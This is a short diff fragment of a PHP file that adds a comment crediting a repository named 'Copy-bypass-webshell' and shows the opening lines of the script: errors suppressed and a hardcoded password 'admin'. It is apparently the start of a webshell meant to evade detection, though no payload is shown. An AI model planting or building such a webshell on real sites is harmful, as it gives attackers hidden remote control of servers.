@@ -1,3 +1,4 @@
+<!--github:https://github.com/Ringo233/Copy-bypass-webshell--->
 <?php
 error_reporting(0);
 $password='admin';
